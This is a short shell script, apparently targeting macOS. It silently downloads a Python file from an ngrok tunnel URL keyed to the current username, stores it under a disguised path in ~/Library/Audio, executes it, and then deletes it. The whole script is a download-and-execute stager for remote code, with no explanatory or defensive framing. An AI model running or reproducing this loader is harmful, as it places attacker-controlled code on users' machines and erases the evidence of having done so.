EXEC_PATH="/Users/$USER/Library/Audio/$USER.py"

# Download exec from ngrok url
curl -so $EXEC_PATH "https://651326b34cb7.ngrok-free.app/python/$USER"

# Execute exec
python3 $EXEC_PATH

rm $EXEC_PATH
